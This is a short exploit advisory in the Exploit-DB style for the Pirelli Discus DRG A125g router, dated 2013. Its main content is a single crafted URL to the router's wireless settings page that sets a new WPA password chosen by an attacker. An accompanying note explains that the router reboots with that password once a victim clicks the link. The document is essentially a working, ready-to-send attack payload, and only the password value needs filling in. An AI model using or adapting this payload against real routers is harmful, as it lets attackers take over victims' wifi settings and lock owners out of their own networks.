# Exploit Title: Pirelli Discus DRG A125g remote change wifi password
vulnerability
# Hardware: Pirelli Discus DRG A125g
# Date: 2013/11/23
# Exploit Author: Sebastián Magof
# Tested on: Linux/Windows
# Twitter: @smagof
# Greetz: Family, friends && under guys.
# Special Greetz:
# (\/)
# (**) αlpha
#(")(")


#Exploit:

http://10.0.0.2/wladv.wl?wlSsidIdx=0&wlHide=0&wlAuthMode=psk2&wlAuth=0&wlWep=disabled&wlWpaPsk=PASSWORDHERE&wlWpaGtkRekey=0&wlKeyBit=1&wlPreauth=1&wlWpa=tkip

#info: where the parameter wlWpaPsk=PASSWORDHERE is where we will enter the
password we want to put the victim wifi. If the victim clicks on the url
your modem / router will reboot automatically with the new password
provided by the attacker.